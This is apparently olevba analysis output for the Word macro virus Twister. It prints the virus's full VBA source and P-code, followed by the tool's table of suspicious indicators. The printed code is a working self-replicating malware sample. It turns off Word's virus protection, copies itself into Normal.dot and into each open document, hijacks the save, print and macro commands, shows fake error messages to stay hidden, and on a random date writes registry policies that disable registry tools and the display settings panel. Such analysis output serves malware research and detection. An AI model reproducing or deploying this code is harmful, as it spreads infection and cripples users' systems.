olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twister.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twister.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Twister.bas 
in file: Virus.MSWord.Twister.a - OLE stream: 'Macros/VBA/Twister'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function InstNor()
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "Twister" Then
    InstNor = True
    End If
Next x
End Function
Function InstDok()
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "Twister" Then
    InstDok = True
    End If
Next x
End Function
Sub AutoOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Application.ScreenUpdating = False: Application.ShowVisualBasicEditor = False
Application.Caption = "Micrøsøft Wørd - TwIsTeR"
Options.VirusProtection = False: Options.SaveNormalPrompt = False
Options.AllowFastSave = False: Options.BlueScreen = True

Assistant.Visible = True
Assistant.Animation = msoAnimationThinking
With Assistant.NewBalloon
    .Heading = "This is WM97.Twister"
    .Text = "Autor: Zerø|<LzØ>"
    .Show
End With
Assistant.Visible = False

FN$ = "C:\Progra~1\TSR32.vxd"
Application.VBE.ActiveVBProject.VBComponents.Item("Twister").Export FN$
Infection
Twister
End Sub
Sub DateiDrucken()
Infection
Twister
Application.ScreenUpdating = False
Randomize
Zu$ = Int((Rnd) * 5 + 1)

Select Case Zu$
Case 1
    Font$ = "Windings"
Case 2
    Font$ = "Bookman Old Style"
Case 3
    Font$ = "Arial"
Case 4
    Font$ = "Times New Roman"
Case 5
    Font$ = "System"
End Select

Selection.WholeStory
FontV$ = Selection.Font.Name
Size$ = Selection.Font.Size
Selection.Font.Name = Font$
Selection.Font.Size = Int((Rnd) * 100 + 1)
Dialogs(wdDialogFilePrint).Show
Selection.Font.Name = FonfV$
Selection.Font.Size = Size$
End Sub
Sub Infection()
On Error Resume Next
If InstNor = False Then
    NormalTemplate.VBProject.VBComponents.Import FN$
End If
If InstDok = False Then
    ActiveDocument.VBProject.VBComponents.Import FN$
End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "This is WM97.Twister"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Autor: Zerø|<LzØ>"
End Sub
Sub DateiSpeichernUnter()
CheckLines
Infection
Twister
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiSpeichern()
Infection
Twister
ActiveDocument.SaveAs WordBasic.[Filename$]
End Sub
Sub CheckLines()
Lines$ = Application.VBE.ActiveCodePane.CodeModule.CountOfLines
If Lines$ <> 171 Then
Infection
End If
End Sub
Sub DateiDruckenStandard()
Twister
Infection
Application.ScreenUpdating = False
WordBasic.EndOfDocument
Selection.TypeParagraph
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.Font.ColorIndex = wdGray25
Selection.Font.Name = "Times New Roman"
Selection.Font.Size = 20
WordBasic.Insert "This is WM97.Twister"
ActiveDocument.PrintOut
End Sub
Sub DateiDokVorlagen()
Twister
Infection
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub AnsichtCode()
Twister
Infection
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub AnsichtVBCode()
Infection
Twister
MsgBox "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!", vbCritical, "Word Fehler:"
End Sub
Sub ExtrasMakro()
Infection
Twister
'Thanxs to Jack Twoflower for this great Code :}
Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim Droplistbox2__$(0)
Droplistbox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
WordBasic.Text 7, 6, 93, 13, "&Makroname:", "Text3"
WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
WordBasic.Pushbutton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
WordBasic.Cancelbutton 470, 38, 137, 21
WordBasic.Pushbutton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
WordBasic.Pushbutton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
WordBasic.Pushbutton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
WordBasic.Pushbutton 470, 154, 137, 21, "O&rganisieren", "Definierbar6"
WordBasic.Pushbutton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
WordBasic.Droplistbox 90, 196, 354, 19, Droplistbox2__$(), "Listbox2"
WordBasic.Text 7, 222, 109, 13, "Besc&hreibung:", "Text2"
WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog

Dim dlg As Object
Set dlg = WordBasic.CurValues.Userdialog

x = WordBasic.Dialog.Userdialog(dlg)
Select Case x
Case 0
WordBasic.Cancel
Case 1 To 6
MsgBox "Zu wenig EMS-Speicher um Anwendung auszuführen!", vbCritical, "Word-Fehler:"
End Select
End Sub
Sub Twister()
Mo$ = Int((Rnd) * 12 + 1)
Da$ = Int((Rnd) * 20 + 1)
If Month(Now) = Mo$ And Day(Now) = Da$ Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDeletePrinter") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoAddPrinter") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = 1
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL") = 1
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Twister.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1055 bytes
' Macros/VBA/Twister - 16083 bytes
' Line #0:
' 	FuncDefn (Function InstNor())
' Line #1:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #2:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Twister"
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (True)
' 	St InstNor 
' Line #4:
' 	EndIfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #6:
' 	EndFunc 
' Line #7:
' 	FuncDefn (Function InstDok())
' Line #8:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Twister"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	St InstDok 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndFunc 
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #18:
' 	LitStr 0x0018 "Micrøsøft Wørd - TwIsTeR"
' 	Ld Application 
' 	MemSt Caption 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt AllowFastSave 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt BlueScreen 
' Line #21:
' Line #22:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #23:
' 	Ld msoAnimationThinking 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #24:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #25:
' 	LitStr 0x0014 "This is WM97.Twister"
' 	MemStWith Heading 
' Line #26:
' 	LitStr 0x0011 "Autor: Zerø|<LzØ>"
' 	MemStWith Then 
' Line #27:
' 	ArgsMemCallWith Show 0x0000 
' Line #28:
' 	EndWith 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #30:
' Line #31:
' 	LitStr 0x0015 "C:\Progra~1\TSR32.vxd"
' 	St FN$ 
' Line #32:
' 	Ld FN$ 
' 	LitStr 0x0007 "Twister"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #33:
' 	ArgsCall Infection 0x0000 
' Line #34:
' 	ArgsCall Twister 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub DateiDrucken())
' Line #37:
' 	ArgsCall Infection 0x0000 
' Line #38:
' 	ArgsCall Twister 0x0000 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #40:
' 	ArgsCall Read 0x0000 
' Line #41:
' 	Ld Rnd 
' 	Paren 
' 	LitDI2 0x0005 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Zu$ 
' Line #42:
' Line #43:
' 	Ld Zu$ 
' 	SelectCase 
' Line #44:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #45:
' 	LitStr 0x0008 "Windings"
' 	St Font$ 
' Line #46:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #47:
' 	LitStr 0x0011 "Bookman Old Style"
' 	St Font$ 
' Line #48:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #49:
' 	LitStr 0x0005 "Arial"
' 	St Font$ 
' Line #50:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #51:
' 	LitStr 0x000F "Times New Roman"
' 	St Font$ 
' Line #52:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #53:
' 	LitStr 0x0006 "System"
' 	St Font$ 
' Line #54:
' 	EndSelect 
' Line #55:
' Line #56:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #57:
' 	Ld Selection 
' 	MemLd Font 
' 	MemLd New 
' 	St FontV$ 
' Line #58:
' 	Ld Selection 
' 	MemLd Font 
' 	MemLd Size 
' 	St Size$ 
' Line #59:
' 	Ld Font$ 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #60:
' 	Ld Rnd 
' 	Paren 
' 	LitDI2 0x0064 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #61:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	Ld FonfV$ 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #63:
' 	Ld Size$ 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub Infection())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Ld InstNor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld FN$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld InstDok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #71:
' 	Ld FN$ 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	LitStr 0x0014 "This is WM97.Twister"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	LitStr 0x0011 "Autor: Zerø|<LzØ>"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x000F "LegalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub DateiSpeichernUnter())
' Line #77:
' 	ArgsCall CheckLines 0x0000 
' Line #78:
' 	ArgsCall Infection 0x0000 
' Line #79:
' 	ArgsCall Twister 0x0000 
' Line #80:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub DateiSpeichern())
' Line #83:
' 	ArgsCall Infection 0x0000 
' Line #84:
' 	ArgsCall Twister 0x0000 
' Line #85:
' 	Ld WordBasic 
' 	MemLd [Filename$] 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub CheckLines())
' Line #88:
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveCodePane 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines$ 
' Line #89:
' 	Ld Lines$ 
' 	LitDI2 0x00AB 
' 	Ne 
' 	IfBlock 
' Line #90:
' 	ArgsCall Infection 0x0000 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub DateiDruckenStandard())
' Line #94:
' 	ArgsCall Twister 0x0000 
' Line #95:
' 	ArgsCall Infection 0x0000 
' Line #96:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #97:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #98:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #99:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #100:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #101:
' 	Ld wdGray25 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	LitStr 0x000F "Times New Roman"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #103:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #104:
' 	LitStr 0x0014 "This is WM97.Twister"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #105:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub DateiDokVorlagen())
' Line #108:
' 	ArgsCall Twister 0x0000 
' Line #109:
' 	ArgsCall Infection 0x0000 
' Line #110:
' 	LitStr 0x0052 "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!"
' 	Ld vbCritical 
' 	LitStr 0x000C "Word Fehler:"
' 	ArgsCall MsgBox 0x0003 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub AnsichtCode())
' Line #113:
' 	ArgsCall Twister 0x0000 
' Line #114:
' 	ArgsCall Infection 0x0000 
' Line #115:
' 	LitStr 0x0052 "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!"
' 	Ld vbCritical 
' 	LitStr 0x000C "Word Fehler:"
' 	ArgsCall MsgBox 0x0003 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub AnsichtVBCode())
' Line #118:
' 	ArgsCall Infection 0x0000 
' Line #119:
' 	ArgsCall Twister 0x0000 
' Line #120:
' 	LitStr 0x0052 "Die zum Ausführen des Programms benötigte Datei (Word32.vxd) wurde nicht gefunden!"
' 	Ld vbCritical 
' 	LitStr 0x000C "Word Fehler:"
' 	ArgsCall MsgBox 0x0003 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub ExtrasMakro())
' Line #123:
' 	ArgsCall Infection 0x0000 
' Line #124:
' 	ArgsCall Twister 0x0000 
' Line #125:
' 	QuoteRem 0x0000 0x002F "Thanxs to Jack Twoflower for this great Code :}"
' Line #126:
' 	Dim 
' 	VarDefn x
' Line #127:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Combobox1__$ 0x0001 (As String)
' Line #128:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Combobox1__$ 0x0001 
' Line #129:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Textbox1__$ 0x0001 (As String)
' Line #130:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Textbox1__$ 0x0001 
' Line #131:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Droplistbox2__$ 0x0001 (As String)
' Line #132:
' 	LitStr 0x0024 "Normal.dot (Globale Dokumentvorlage)"
' 	LitDI2 0x0000 
' 	ArgsSt Droplistbox2__$ 0x0001 
' Line #133:
' Line #134:
' 	LitDI2 0x026C 
' 	LitDI2 0x0118 
' 	LitStr 0x0006 "Makros"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #135:
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "&Makroname:"
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #136:
' 	LitDI2 0x0007 
' 	LitDI2 0x0017 
' 	LitDI2 0x01B3 
' 	LitDI2 0x00AA 
' 	ArgsLd Combobox1__$ 0x0000 
' 	LitStr 0x0009 "Combobox1"
' 	Ld WordBasic 
' 	ArgsMemCall ComboBox 0x0006 
' Line #137:
' 	LitDI2 0x01D6 
' 	LitDI2 0x000E 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Ausführen"
' 	LitStr 0x000C "Definierbar2"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #138:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0026 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall Cancelbutton 0x0004 
' Line #139:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0048 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0014 "&Schrittweise prüfen"
' 	LitStr 0x000C "Definierbar3"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #140:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0060 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000B "&Bearbeiten"
' 	LitStr 0x000C "Definierbar4"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #141:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0082 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Erstellen"
' 	LitStr 0x000C "Definierbar5"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #142:
' 	LitDI2 0x01D6 
' 	LitDI2 0x009A 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "O&rganisieren"
' 	LitStr 0x000C "Definierbar6"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #143:
' 	LitDI2 0x01D6 
' 	LitDI2 0x00B2 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0010 "&Organisieren..."
' 	LitStr 0x000C "Definierbar7"
' 	Ld WordBasic 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #144:
' 	LitDI2 0x0007 
' 	LitDI2 0x00C8 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "Ma&kros in:"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #145:
' 	LitDI2 0x005A 
' 	LitDI2 0x00C4 
' 	LitDI2 0x0162 
' 	LitDI2 0x0013 
' 	ArgsLd Droplistbox2__$ 0x0000 
' 	LitStr 0x0008 "Listbox2"
' 	Ld WordBasic 
' 	ArgsMemCall Droplistbox 0x0006 
' Line #146:
' 	LitDI2 0x0007 
' 	LitDI2 0x00DE 
' 	LitDI2 0x006D 
' 	LitDI2 0x000D 
' 	LitStr 0x000E "Besc&hreibung:"
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #147:
' 	LitDI2 0x0007 
' 	LitDI2 0x00EB 
' 	LitDI2 0x01B5 
' 	LitDI2 0x0026 
' 	ArgsLd Textbox1__$ 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #148:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #149:
' Line #150:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #151:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd Userdialog 
' 	Set dlg 
' Line #152:
' Line #153:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd Userdialog 0x0001 
' 	St x 
' Line #154:
' 	Ld x 
' 	SelectCase 
' Line #155:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #156:
' 	Ld WordBasic 
' 	ArgsMemCall Cancel 0x0000 
' Line #157:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	CaseTo 
' 	CaseDone 
' Line #158:
' 	LitStr 0x002F "Zu wenig EMS-Speicher um Anwendung auszuführen!"
' 	Ld vbCritical 
' 	LitStr 0x000C "Word-Fehler:"
' 	ArgsCall MsgBox 0x0003 
' Line #159:
' 	EndSelect 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub Twister())
' Line #162:
' 	Ld Rnd 
' 	Paren 
' 	LitDI2 0x000C 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Mo$ 
' Line #163:
' 	Ld Rnd 
' 	Paren 
' 	LitDI2 0x0014 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Da$ 
' Line #164:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Mo$ 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Da$ 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #165:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x000F "NoDeletePrinter"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #166:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x000C "NoAddPrinter"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #167:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System"
' 	LitStr 0x0014 "DisableRegistryTools"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #168:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System"
' 	LitStr 0x0009 "NoDispCPL"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	EndSub 
' Line #171:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

